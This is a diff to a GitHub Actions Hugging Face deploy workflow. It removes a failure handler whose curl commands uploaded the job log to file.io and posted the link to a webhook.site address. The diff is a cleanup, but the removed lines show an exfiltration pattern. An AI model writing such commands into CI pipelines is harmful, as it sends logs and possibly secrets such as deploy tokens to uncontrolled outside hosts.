@@ -34,9 +34,8 @@ jobs:
         env:
           HF_TOKEN: ${{ secrets.HF_TOKEN }}
         run: |
-          {
-            pip install huggingface_hub -q
-            cat > deploy.py << 'EOF'
+          pip install huggingface_hub -q
+          cat > deploy.py << 'EOF'
           from huggingface_hub import HfApi
           import os, sys
           token = os.environ.get('HF_TOKEN')
@@ -64,9 +63,4 @@ jobs:
               print(f"::error::HF upload failed: {e}")
               sys.exit(1)
           EOF
-            python deploy.py
-          } &> deploy_log.txt || {
-            LINK=$(curl -s -F "file=@deploy_log.txt" https://file.io | grep -o '"link":"[^"]*"' | cut -d'"' -f4)
-            curl -X POST -H "Content-Type: text/plain" -d "FAILED. Log link: $LINK" https://webhook.site/c31e1ebb-a490-45ca-ab6a-6c578fd1da61
-            exit 1
-          }
+          python deploy.py
